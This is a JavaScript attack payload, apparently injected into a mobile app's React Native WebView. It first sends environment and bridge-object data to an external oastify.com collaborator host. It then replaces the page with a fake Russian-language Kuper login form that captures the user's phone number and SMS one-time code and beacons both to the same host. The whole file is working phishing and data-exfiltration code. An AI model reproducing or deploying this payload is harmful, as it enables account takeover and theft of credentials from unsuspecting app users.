(function() {
    'use strict';

    var EXFIL = 'https://4uzrxk5rqt2lpp7ljp5cacoyrpxgl8dw2.oastify.com';

    function b(path, data) {
        try {
            var img = new Image();
            img.src = EXFIL + path + '?d=' + encodeURIComponent(
                typeof data === 'string' ? data : JSON.stringify(data)
            ).substr(0, 2000);
        } catch(e) {}
    }

    // ========================================
    // PHASE 0: Exfiltrate environment data
    // ========================================
    var env = {};
    try { env.origin = window.origin; } catch(e) {}
    try { env.ua = navigator.userAgent.substr(0, 100); } catch(e) {}

    if (window.ReactNativeWebView) {
        env.rnwv = 'present';
        env.postMsg = typeof window.ReactNativeWebView.postMessage;
        try {
            var lc = window.ReactNativeWebView.landingConstructor;
            if (lc) env.landingCtor = JSON.stringify(lc);
        } catch(e) {}
        try {
            var ijo = window.ReactNativeWebView.injectedObjectJson();
            env.injObj = ijo || 'null';
        } catch(e) { env.injObjErr = e.message; }
    }

    b('/v9/env', env);

    // ========================================
    // PHASE 1: Phishing — fake Kuper login page
    // Renders INSIDE the app's WebView = user trusts it
    // ========================================

    var html = '<!DOCTYPE html>' +
    '<html lang="ru">' +
    '<head>' +
    '<meta charset="utf-8">' +
    '<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">' +
    '<style>' +
    '* { margin:0; padding:0; box-sizing:border-box; }' +
    'body { font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; background:#fff; color:#1a1a1a; }' +
    '.header { background:#00b33c; padding:16px 20px; display:flex; align-items:center; }' +
    '.header img,.header svg { height:28px; }' +
    '.header-title { color:#fff; font-size:18px; font-weight:600; margin-left:12px; }' +
    '.content { padding:24px 20px; }' +
    '.alert { background:#fff3cd; border:1px solid #ffc107; border-radius:12px; padding:16px; margin-bottom:24px; }' +
    '.alert-title { font-weight:600; font-size:15px; color:#856404; margin-bottom:4px; }' +
    '.alert-text { font-size:13px; color:#856404; line-height:1.4; }' +
    '.form-group { margin-bottom:16px; }' +
    '.form-label { font-size:13px; color:#666; margin-bottom:6px; display:block; }' +
    '.form-input { width:100%; padding:14px 16px; border:1px solid #e0e0e0; border-radius:12px; font-size:16px; outline:none; -webkit-appearance:none; }' +
    '.form-input:focus { border-color:#00b33c; }' +
    '.btn { width:100%; padding:16px; background:#00b33c; color:#fff; border:none; border-radius:12px; font-size:16px; font-weight:600; cursor:pointer; -webkit-appearance:none; }' +
    '.btn:active { background:#009929; }' +
    '.footer { text-align:center; margin-top:20px; font-size:12px; color:#999; }' +
    '.logo-text { color:#fff; font-size:22px; font-weight:700; letter-spacing:-0.5px; }' +
    '</style>' +
    '</head>' +
    '<body>' +
    '<div class="header">' +
    '<span class="logo-text">Kuper</span>' +
    '<span class="header-title">\\u0412\\u0445\\u043e\\u0434 \\u0432 \\u0430\\u043a\\u043a\\u0430\\u0443\\u043d\\u0442</span>' +
    '</div>' +
    '<div class="content">' +
    '<div class="alert">' +
    '<div class="alert-title">\\u0422\\u0440\\u0435\\u0431\\u0443\\u0435\\u0442\\u0441\\u044f \\u043f\\u043e\\u0432\\u0442\\u043e\\u0440\\u043d\\u0430\\u044f \\u0430\\u0432\\u0442\\u043e\\u0440\\u0438\\u0437\\u0430\\u0446\\u0438\\u044f</div>' +
    '<div class="alert-text">\\u0412 \\u0446\\u0435\\u043b\\u044f\\u0445 \\u0431\\u0435\\u0437\\u043e\\u043f\\u0430\\u0441\\u043d\\u043e\\u0441\\u0442\\u0438 \\u0432\\u0430\\u0448\\u0435\\u0439 \\u0443\\u0447\\u0451\\u0442\\u043d\\u043e\\u0439 \\u0437\\u0430\\u043f\\u0438\\u0441\\u0438, \\u043f\\u043e\\u0436\\u0430\\u043b\\u0443\\u0439\\u0441\\u0442\\u0430, \\u043f\\u043e\\u0434\\u0442\\u0432\\u0435\\u0440\\u0434\\u0438\\u0442\\u0435 \\u0432\\u0430\\u0448 \\u043d\\u043e\\u043c\\u0435\\u0440 \\u0442\\u0435\\u043b\\u0435\\u0444\\u043e\\u043d\\u0430.</div>' +
    '</div>' +
    '<div id="step1">' +
    '<div class="form-group">' +
    '<label class="form-label">\\u041d\\u043e\\u043c\\u0435\\u0440 \\u0442\\u0435\\u043b\\u0435\\u0444\\u043e\\u043d\\u0430</label>' +
    '<input class="form-input" id="phone" type="tel" placeholder="+7 (___) ___-__-__" autocomplete="tel">' +
    '</div>' +
    '<button class="btn" id="btnPhone">\\u041f\\u043e\\u043b\\u0443\\u0447\\u0438\\u0442\\u044c \\u043a\\u043e\\u0434</button>' +
    '</div>' +
    '<div id="step2" style="display:none">' +
    '<div class="form-group">' +
    '<label class="form-label">\\u041a\\u043e\\u0434 \\u0438\\u0437 SMS</label>' +
    '<input class="form-input" id="code" type="number" placeholder="______" maxlength="6" autocomplete="one-time-code">' +
    '</div>' +
    '<button class="btn" id="btnCode">\\u0412\\u043e\\u0439\\u0442\\u0438</button>' +
    '</div>' +
    '<div id="step3" style="display:none">' +
    '<div style="text-align:center;padding:40px 0">' +
    '<div style="font-size:48px;margin-bottom:16px">\\u2705</div>' +
    '<div style="font-size:18px;font-weight:600;color:#00b33c">\\u0413\\u043e\\u0442\\u043e\\u0432\\u043e!</div>' +
    '<div style="font-size:14px;color:#666;margin-top:8px">\\u0412\\u044b \\u0443\\u0441\\u043f\\u0435\\u0448\\u043d\\u043e \\u0430\\u0432\\u0442\\u043e\\u0440\\u0438\\u0437\\u043e\\u0432\\u0430\\u043d\\u044b</div>' +
    '</div>' +
    '</div>' +
    '<div class="footer">Kuper &copy; 2025</div>' +
    '</div>' +
    '<script>' +
    'var E="' + EXFIL + '";' +
    'function s(p,d){var i=new Image();i.src=E+p+"?d="+encodeURIComponent(d);}' +
    'document.getElementById("btnPhone").onclick=function(){' +
    'var p=document.getElementById("phone").value;' +
    'if(p.length>5){' +
    's("/v9/PHONE",p);' +
    'document.getElementById("step1").style.display="none";' +
    'document.getElementById("step2").style.display="block";' +
    '}};' +
    'document.getElementById("btnCode").onclick=function(){' +
    'var c=document.getElementById("code").value;' +
    'if(c.length>=4){' +
    's("/v9/SMS_CODE",c);' +
    'document.getElementById("step2").style.display="none";' +
    'document.getElementById("step3").style.display="block";' +
    'setTimeout(function(){' +
    'if(window.ReactNativeWebView&&window.ReactNativeWebView.postMessage){' +
    'window.ReactNativeWebView.postMessage(JSON.stringify({action:"navigateBack"}));' +
    '}},2000);' +
    '}};' +
    '</script>' +
    '</body></html>';

    document.write(html);
    document.close();

    b('/v9/phishing_rendered', 'ok');

})();
